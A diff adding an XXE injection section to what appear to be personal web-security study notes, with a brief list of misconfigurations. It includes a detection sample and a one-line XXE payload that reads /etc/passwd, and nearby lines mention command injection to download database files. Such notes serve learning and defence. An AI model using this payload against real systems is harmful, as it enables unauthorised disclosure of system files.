@@ -47,6 +47,30 @@ If an attacker is able to find flaws in an authentication mechanism, they would 
 3. Dork with Google or Github
 4. Try downloading db files with command injection
 
+## XXE injection
+
+It arises from exploiting parsing of ENTITY element. It can be prevented by smart conding practices depending on language used: https://brightsec.com/blog/xxe-prevention/
+
+For payloads refer to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#exploiting-xxe-to-retrieve-files
+
+1. Detect XXE
+```
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
+ <userInfo>
+  <firstName>John</firstName>
+  <lastName>&example;</lastName>
+ </userInfo>
+```
+2. Exploit 
+`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>`
+
+## Security Misconfigurations
+
+* Accessible S3 Buckets
+* Non functional additional features enabled: like status pages, accounts or privileges
+* 
+
 # Advanced Web Attacks
 
 ## API
